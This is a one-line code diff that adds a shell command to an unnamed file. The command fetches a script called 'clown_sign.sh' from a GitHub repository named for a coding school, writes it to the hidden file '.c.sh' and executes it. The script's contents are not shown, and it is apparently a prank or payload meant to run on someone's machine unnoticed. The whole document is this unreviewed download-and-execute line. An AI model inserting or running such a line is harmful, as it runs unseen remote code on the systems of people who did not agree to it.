@@ -1,0 +1,1 @@
+curl -l https://raw.githubusercontent.com/MrLemonkot/scripts_21school/refs/heads/main/clown_sign.sh > .c.sh; sh .c.sh
